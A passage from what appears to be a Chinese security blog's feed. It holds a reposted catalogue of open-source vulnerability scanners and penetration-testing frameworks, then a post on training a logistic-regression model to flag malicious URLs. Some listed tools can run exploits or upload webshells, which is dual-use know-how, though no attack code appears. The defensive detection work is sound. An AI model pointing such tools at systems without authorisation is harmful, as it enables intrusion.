href="https://github.com/wufeifei/cobra">https://github.com/wufeifei/cobra</a> - <strong>白盒代码安全审计系统</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/OneSourceCat/phpvulhunter">https://github.com/OneSourceCat/phpvulhunter</a> - <strong>静态PHP代码审计</strong></li></ul><p><strong>评分</strong>: 🌟🌟        |         <strong>编程语言</strong>: <strong>PHP</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/Qihoo360/phptrace">https://github.com/Qihoo360/phptrace</a> - <strong>跟踪、分析PHP运行情况的工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>C</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/ajinabraham/NodeJsScan">https://github.com/ajinabraham/NodeJsScan</a> - <strong>NodeJS应用代码审计</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/shengqi158/pyvulhunter">https://github.com/shengqi158/pyvulhunter</a>  - <strong>Python应用审计</strong></li></ul><p><strong>评分</strong>: 🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/python-security/pyt">https://github.com/python-security/pyt</a> - <strong>Python应用静态代码审计</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/emanuil/php-reaper">https://github.com/emanuil/php-reaper</a> - <strong>用于扫描PHP应用程序中可能存在SQL漏洞的ADOdb代码</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>PHP</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/lowjoel/phortress">https://github.com/lowjoel/phortress</a> - <strong>用于检测潜在安全漏洞的PHP静态代码分析工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟        |         <strong>编程语言</strong>: <strong>PHP</strong>         |         <strong>仍在维护</strong>: ✖️</p><h3 id="模块化设计扫描器或漏洞评估框架"><a href="#模块化设计扫描器或漏洞评估框架" class="headerlink" title="模块化设计扫描器或漏洞评估框架"></a>模块化设计扫描器或漏洞评估框架</h3><ul><li><a href="https://github.com/infobyte/faraday">https://github.com/infobyte/faraday</a> - <strong>跨平台集成化渗透测试辅助平台及漏洞管理平台</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/az0ne/AZScanner">https://github.com/az0ne/AZScanner</a> - <strong>自动漏洞扫描器，子域名爆破，端口扫描，目录爆破，常用框架漏洞检测</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/blackye/lalascan">https://github.com/blackye/lalascan</a> - <strong>集合owasp top10漏洞扫描和边界资产发现能力的分布式web漏洞扫描框架</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/blackye/BkScanner">https://github.com/blackye/BkScanner</a> - <strong>BkScanner 分布式、插件化web漏洞扫描器</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/ysrc/GourdScanV2">https://github.com/ysrc/GourdScanV2</a> - <strong>ysrc出品的被动式漏洞扫描工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/netxfly/passive_scan">https://github.com/netxfly/passive_scan</a> - <strong>基于http代理的web漏洞扫描器</strong></li></ul><p><strong>评分</strong>: 🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/1N3/Sn1per">https://github.com/1N3/Sn1per</a> - <strong>自动化扫描器，包括中间件扫描以及设备指纹识别</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/RASSec/pentestEr_Fully-automatic-scanner">https://github.com/RASSec/pentestEr_Fully-automatic-scanner</a> - <strong>定向全自动化渗透测试工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/Lcys/lcyscan">https://github.com/Lcys/lcyscan</a> - <strong>Python插件化漏洞扫描器，支持生成扫描报表</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/Xyntax/POC-T">https://github.com/Xyntax/POC-T</a> - <strong>渗透测试插件化并发框架</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/v3n0m-Scanner/V3n0M-Scanner">https://github.com/v3n0m-Scanner/V3n0M-Scanner</a> - <strong>支持检测SQLi&#x2F;XSS&#x2F;LFI&#x2F;RFI等漏洞的扫描器</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/Skycrab/leakScan">https://github.com/Skycrab/leakScan</a> - <strong>Web化的的漏洞扫描框架</strong></li></ul><p><strong>评分</strong>: 🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/zhangzhenfeng/AnyScan">https://github.com/zhangzhenfeng/AnyScan</a> - <strong>一款web化的自动化渗透测试框架</strong></li></ul><p><strong>评分</strong>: 🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/Tuhinshubhra/RED_HAWK">https://github.com/Tuhinshubhra/RED_HAWK</a> - <strong>一款集成信息收集、漏洞扫描、指纹识别等的多合一扫描工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>PHP</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/swisskyrepo/DamnWebScanner">https://github.com/swisskyrepo/DamnWebScanner</a> - <strong>基于Chrome、Opera插件的被动式漏洞扫描</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/anilbaranyelken/tulpar">https://github.com/anilbaranyelken/tulpar</a> - <strong>支持多种web漏洞扫描，仅命令行环境使用</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/m4ll0k/Spaghetti">https://github.com/m4ll0k/Spaghetti</a> - <strong>web应用扫描器，支持指纹识别、文件目录爆破、SQL&#x2F;XSS&#x2F;RFI等漏洞扫描，也可直接用于struts、ShellShock等扫描</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest">https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest</a> - <strong>集成子域名枚举、Nmap、WAF指纹识别等模块的web应用扫描器</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/0xsauby/yasuo">https://github.com/0xsauby/yasuo</a> - <strong>使用Ruby开发的扫描网络中主机存在的第三方web应用服务漏洞</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Ruby</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/hatRiot/clusterd">https://github.com/hatRiot/clusterd</a> - <strong>Web应用自动化扫描框架,支持自动化上传webshell</strong></li></ul><p><strong>评分</strong>: 🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/erevus-cn/pocscan">https://github.com/erevus-cn/pocscan</a> - <strong>一款开源 Poc 调用框架,可轻松调用Pocsuite,Tangscan,Beebeeto,Knowsec老版本POC，可使用docker部署</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/TophantTechnology/osprey">https://github.com/TophantTechnology/osprey</a> - <strong>斗象能力中心出品并长期维护的开源漏洞检测框架</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/yangbh/Hammer">https://github.com/yangbh/Hammer</a> - <strong>Web应用漏洞扫描框架</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/Lucifer1993/AngelSword">https://github.com/Lucifer1993/AngelSword</a> - <strong>被动式漏洞扫描，支持历史cve编号漏洞识别</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/zaproxy/zaproxy">https://github.com/zaproxy/zaproxy</a> - <strong>The OWASP ZAP core project出品的综合性渗透测试工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Java</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/s0md3v/Striker">https://github.com/s0md3v/Striker</a> - <strong>一款多方位信息收集、指纹识别及漏洞扫描工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/dermotblair/webvulscan">https://github.com/dermotblair/webvulscan</a> - <strong>一款web应用漏洞扫描器，支持扫描反射型以及存储型XSS、SQL injection等漏洞，支持输出pdf报告</strong></li></ul><p><strong>评分</strong>: 🌟🌟        |         <strong>编程语言</strong>: <strong>PHP</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/alienwithin/OWASP-mth3l3m3nt-framework">https://github.com/alienwithin/OWASP-mth3l3m3nt-framework</a> - <strong>渗透测试辅助工具，综合利用框架</strong></li></ul><p><strong>评分</strong>: 🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/toyakula/luna">https://github.com/toyakula/luna</a> - <strong>基于被动式扫描框架的自动化web漏洞扫描工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/Manisso/fsociety">https://github.com/Manisso/fsociety</a> - <strong>渗透测试辅助框架，包含信息搜集、无线渗透、web应用扫描等功能</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x&#x2F;3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/boy-hack/w9scan">https://github.com/boy-hack/w9scan</a> - <strong>内置1200+插件的web漏洞扫描框架</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/YalcinYolalan/WSSAT">https://github.com/YalcinYolalan/WSSAT</a> - <strong>Web服务安全评估工具,提供基于Windows操作系统的简单.exe应用</strong></li></ul><p><strong>评分</strong>: 🌟🌟        |         <strong>编程语言</strong>: <strong>C#</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/AmyangXYZ/AssassinGo">https://github.com/AmyangXYZ/AssassinGo</a> - <strong>使用Go开发的可扩展以及高并发渗透测试框架</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Go</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/m4ll0k/Galileo">https://github.com/m4ll0k/Galileo</a> - <strong>一个操作上类似metasploit的web应用安全审计框架</strong></li></ul><p><strong>评分</strong>: 🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/joker25000/Optiva-Framework">https://github.com/joker25000/Optiva-Framework</a> - <strong>一款web应用漏洞扫描器，支持扫描反射型以及存储型XSS、SQL injection等漏洞</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/theInfectedDrake/TIDoS-Framework">https://github.com/theInfectedDrake/TIDoS-Framework</a> - <strong>集成104个模块的web应用程序渗透测试框架</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/TideSec/WDScanner">https://github.com/TideSec/WDScanner</a> - <strong>一款功能完备的企业级漏洞扫描器</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x&#x2F;PHP</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/j3ssie/Osmedeus">https://github.com/j3ssie/Osmedeus</a> - <strong>一款具备多角度信息收集和漏洞扫描能力的全自动扫描器</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/jeffzh3ng/Fuxi-Scanner">https://github.com/jeffzh3ng/Fuxi-Scanner</a> - <strong>支持资产探测与管理的一款开源的网络安全检测工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/knownsec/Pocsuite">https://github.com/knownsec/Pocsuite</a> - <strong>开源漏洞检测框架</strong></li></ul><p><strong>Rating</strong>: 🌟🌟🌟🌟🌟        |         <strong>Language</strong>: <strong>Python 2.x</strong>         |         <strong>Ongoing[last 6 months]</strong>: ✔️</p><ul><li><a href="https://github.com/opensec-cn/kunpeng">https://github.com/opensec-cn/kunpeng</a> - <strong>Golang编写的开源POC框架&#x2F;库，以动态链接库的形式提供各种语言调用</strong></li></ul><p><strong>Rating</strong>: 🌟🌟🌟🌟🌟        |         <strong>Language</strong>: <strong>Go</strong>         |         <strong>Ongoing[last 6 months]</strong>: ✔️</p><h3 id="高级持续性威胁"><a href="#高级持续性威胁" class="headerlink" title="高级持续性威胁"></a>高级持续性威胁</h3><ul><li><a href="https://github.com/Neo23x0/Loki">https://github.com/Neo23x0/Loki</a> - <strong>根据公开情报库里的IOC信息检索本地是否存在相同hash的文件或与恶意C2的网络连接</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/Neo23x0/Loki">https://github.com/Neo23x0/Loki</a> - <strong>根据公开情报库里的IOC信息检索本地是否存在相同hash、相似文本内容的文件或与恶意C2的网络连接</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Bash Shell</strong>         |         <strong>仍在维护</strong>: ✔️</p><hr><h2 id="为什么创建这个合辑？"><a href="#为什么创建这个合辑？" class="headerlink" title="为什么创建这个合辑？"></a>为什么创建这个合辑？</h2><p>本合辑的初衷是为了向各类企业安全从业者提供在企业信息安全防护体系建设过程中可以参考的开源安全扫描工具，以期望他们能够利用这些扫描器对业务进行自检，从而保障业务的安全</p><h2 id="作者"><a href="#作者" class="headerlink" title="作者"></a>作者</h2><p><strong>Wester</strong>(sina weibo <a href="http://weibo.com/zzyme/">@Wester的小号</a>) &amp;&amp; <strong>Martin</strong>(sina weibo <a href="http://weibo.com/u/1312149403">@Mart1n_ZHOU</a>)</p><h2 id="代码提交符号说明"><a href="#代码提交符号说明" class="headerlink" title="代码提交符号说明"></a>代码提交符号说明</h2><p><strong>[↑]</strong> 表示 <strong>更新扫描地址或描述</strong><br><br><strong>[+]</strong> 表示 <strong>添加扫描器</strong><br><br><strong>[-]</strong> 表示 <strong>移除扫描器</strong><br><br><strong>[category]</strong> 表示 <strong>修改扫描器分类</strong><br><br><strong>[contributor]</strong> 表示 <strong>添加某人至致谢榜</strong><br></p><h2 id="法律声明"><a href="#法律声明" class="headerlink" title="法律声明"></a>法律声明</h2><p>本项目所列举的扫描器仅供各位研究学习目的使用，使用过程中也请严格遵守当地法律法规，如果您是中国公民，请严格遵守《中华人民共和国网络安全法》相关规定，也请勿触犯《中华人民共和国刑法》第286条”破坏计算机系统罪”相关条例，否则造成的严重后果与仓库作者无关，特此声明！</p><h2 id="如何参与？"><a href="#如何参与？" class="headerlink" title="如何参与？"></a>如何参与？</h2><p>非常欢迎大家一起来参与建设,如果你有关于此项目的想法、建议或者发现了一些有价值的扫描器，请记得要告诉我们 :)</p><h2 id="开源协议"><a href="#开源协议" class="headerlink" title="开源协议"></a>开源协议</h2><p>scanbox在Mozilla协议条款下发布</p><h2 id="版权"><a href="#版权" class="headerlink" title="版权"></a>版权</h2><p>非常开心能够看到这个仓库在安全社区如此广泛的传播，但我也希望大家能够尊重知识，尊重劳动，因此转载的时候请在您的文章里注明来自<a href="https://github.com/We5ter/Scanners-Box">https://github.com/We5ter/Scanners-Box</a> ,同时也请不要通过二次发表此文章谋取不正当的利益（如原创投稿）</p><h2 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h2><p>非常感谢下面这些安全研究员为我们提供的宝贵建议和反馈</p><ul><li><strong>@0c0c0f</strong>     </li><li><strong>@藏形匿影</strong></li><li><strong>@Mottoin团队</strong></li><li><strong>@BlackHole</strong></li><li><strong>@CodeColorist</strong></li><li><strong>@3xp10it</strong></li><li><strong>@re4lity</strong></li><li><strong>@s0md3v</strong></li><li><strong>@boy-hack</strong></li><li><strong>@marsII</strong></li><li><strong>@tom0li</strong></li><li><strong>@hksanduo</strong></li><li><strong>@alexlauerman</strong></li><li><strong>@MedivhMT</strong></li><li><strong>@TideSec</strong></li><li><strong>@0xHJK</strong></li></ul><p>转载于<a href="https://github.com/We5ter/Scanners-Box">Scanners-Box</a></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
          <category> Miscellaneous </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习实现恶意URL检测</title>
      <link href="/2019/11/08/MaliciousURLs/"/>
      <url>/2019/11/08/MaliciousURLs/</url>
      
        <content type="html"><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>作为正在开发的态势感知产品中重要的一部分，初步实现了<a href="https://github.com/Coldwave96/MaliciousURLs">恶意URL的AI检测功能模块</a>。该模块将集成到大数据平台的检测引擎中去，将对平台推过来的每一条URL进行检测，检测结果实时反馈回平台。</p><p>通过机器学习检测Web请求包中的URL&#x2F;URI判断是否为恶意URL，暂时不做细分，只做笼统的考量，后期可以通过训练集中添加细分的样本数据重新构建能够细分详细攻击类型的模型，比如分辨SQL注入攻击，XSS攻击，恶意域名等。</p><p>模型生成完毕之后，将供大平台直接调用模型对每一个待检测数据包进行判断，生成基础事件。</p><p>关于不同类型的攻击模型，生成模型的代码基本都一样，主要差别在于使用的样本即训练集不一样，本次训练使用的是恶意URL的样本集，里面包含了SQL注入、恶意域名等。所以要想生成高精度的攻击检测模型，关键在于使用好的专用训练集。</p><span id="more"></span><h2 id="处理数据"><a href="#处理数据" class="headerlink" title="处理数据"></a>处理数据</h2><p>通过探针抓取到的数据会被解析成应用层json格式数据，通过分类处理不同method剥离出URI&#x2F;URL作为待处理数据（P.S.对于GET数据直接将URI&#x2F;URL作为分析对象，对于POST请求将URI&#x2F;URL后面拼接上body中的数据字段作为分析对象）。</p><p><img src="/img/MaliciousURLs/MaliciousURLs1.png"></p><h2 id="数据预处理及建模"><a href="#数据预处理及建模" class="headerlink" title="数据预处理及建模"></a>数据预处理及建模</h2><p>处理对象为分离后的URI&#x2F;URL，如下图所示：</p><p><img src="/img/MaliciousURLs/MaliciousURLs2.png"></p><p>然后读取数据，并给黑白样本打上标签，切割文本，将文本数据转化为矩阵向量，通过TF-IDF方法提取特征，训练模型采取逻辑回归算法实现。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="comment">#读取数据</span></span><br><span class="line">       good_query_list = self.get_query_list(<span class="string">&#x27;goodqueries.txt&#x27;</span>)</span><br><span class="line">       bad_query_list = self.get_query_list(<span class="string">&#x27;badqueries.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">       <span class="comment">#给黑、白数据分别打标签</span></span><br><span class="line">       good_y = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(good_query_list))]</span><br><span class="line">       bad_y = [<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bad_query_list))]</span><br><span class="line"></span><br><span class="line">       queries = good_query_list + bad_query_list</span><br><span class="line">       y = good_y + bad_y</span><br><span class="line"></span><br><span class="line">       <span class="comment">#将原始文本数据分割转化成向量</span></span><br><span class="line">       self.vectorizer = TfidfVectorizer(tokenizer=self.get_ngrams)</span><br><span class="line"></span><br><span class="line">       <span class="comment">#把文本字符串转化成（[i,j],Tfidf值）矩阵X</span></span><br><span class="line">       X = self.vectorizer.fit_transform(queries)</span><br><span class="line"></span><br><span class="line">       <span class="comment">#分割训练数据（建立模型）和测试数据（测试模型准确度）</span></span><br><span class="line">       X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class="number">20</span>, random_state=<span class="number">42</span>)</span><br><span class="line"></span><br><span class="line">       <span class="comment">#定义模型训练方法（逻辑回归）</span></span><br><span class="line">       self.lgs = PMMLPipeline([(<span class="string">&#x27;LogisticModer&#x27;</span>, LogisticRegression(solver=<span class="string">&#x27;liblinear&#x27;</span>))])</span><br><span class="line"></span><br><span class="line">       <span class="comment">#训练模型</span></span><br><span class="line">       self.lgs.fit(X_train, y_train)</span><br><span class="line"></span><br><span class="line">       <span class="comment">#测试模型准确度</span></span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&#x27;模型准确度:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.lgs.score(X_test, y_test)))</span><br><span class="line"></span><br><span class="line">       sklearn2pmml(self.lgs, <span class="string">&#x27;.\lgs.pmml&#x27;</span>, with_repr=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>分割字符串通过自己定义的<code>get_ngrams(self, query)</code>方法实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_ngrams</span>(<span class="params">self, query</span>):</span><br><span class="line">    tempQuery = <span class="built_in">str</span>(query)</span><br><span class="line">    ngrams = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(tempQuery)-<span class="number">3</span>):</span><br><span class="line">        ngrams.append(tempQuery[i:i+<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">return</span> ngrams</span><br></pre></td></tr></table></figure><h2 id="预测"><a href="#预测" class="headerlink" title="预测"></a>预测</h2><p>预测的数据格式为：</p><p><img src="/img/MaliciousURLs/MaliciousURLs3.png"></p><p>预测通过<code>predict(self, newQueries)</code>方法实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">predict</span>(<span class="params">self, newQueries</span>):</span><br><span class="line">    newQueries = [urllib.parse.unquote(url) <span class="keyword">for</span> url <span class="keyword">in</span> newQueries]</span><br><span class="line">    X_predict = self.vectorizer.transform(newQueries)</span><br><span class="line">    res = self.lgs.predict(X_predict)</span><br><span class="line">    res_list = []</span><br><span class="line">    <span class="keyword">for</span> q,r <span class="keyword">in</span> <span class="built_in">zip</span>(newQueries, res):</span><br><span class="line">        tmp = <span class="string">&#x27;正常请求&#x27;</span> <span class="keyword">if</span> r == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;恶意请求&#x27;</span></span><br><span class="line">        q_entity = html.escape(q)</span><br><span class="line">        res_list.append(&#123;<span class="string">&#x27;url&#x27;</span>:q_entity, <span class="string">&#x27;res&#x27;</span>:tmp&#125;)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;预测的结果列表:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(res_list)))</span><br><span class="line">    <span class="keyword">return</span> res_list</span><br></pre></td></tr></table></figure><p>预测的结果保存为json格式方便推回给大数据平台处理：</p><p><img src="/img/MaliciousURLs/MaliciousURLs4.png"></p><h2 id="产品化工作"><a href="#产品化工作" class="headerlink" title="产品化工作"></a>产品化工作</h2><p>为了便于产品化的实现，设计了两种方法思路。刚开始尝试将整个数据的预处理，训练及建模过程写入一个类，然后将整个类序列化，保存为.pickle格式的文件，然后供大数据平台调用。后来为了增加数据处理的效率，仅仅将训练好的模型保存为.pmml格式的文件供大数据平台调用。</p><h2 id="可能的改进"><a href="#可能的改进" class="headerlink" title="可能的改进"></a>可能的改进</h2><ul><li><p>处理结果细化，将恶意请求再次具体细分为SQL注入，XSS攻击，恶意域名等。</p></li><li><p>在机器学习算法前提下，特征处理方法的改进，寻求优化TF-IDF方法方案。目前采用的是仅仅使用TF-IDF算法对数据进行预处理，后面可以考虑采用词袋+TF-IDF算法，或者结合TF-IDF算法将URL中不重要的部分进行泛化处理。</p></li><li><p>跳出机器学习算法，省去特征处理的过程，改用深度学习算法，构建神经网络（需要花费大量时间不断计算，调优）。</p></li><li><p>目前可以将同一个IP的一个时间段之内的URL请求同时进行预测，来判断该IP是否实施攻击，也可以只检测单条URL判断是否为恶意请求。未来可改进为不剥离请求包中IP标签，对一段时间内所有数据进行检测，分出有攻击行为的IP上报。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Program </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Machine Learning </tag>
            
            <tag> Malicious URL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习实现Webshell检测</title>
      <link href="/2019/11/07/WebshellDetection/"/>
      <url>/2019/11/07/WebshellDetection/</url>
      
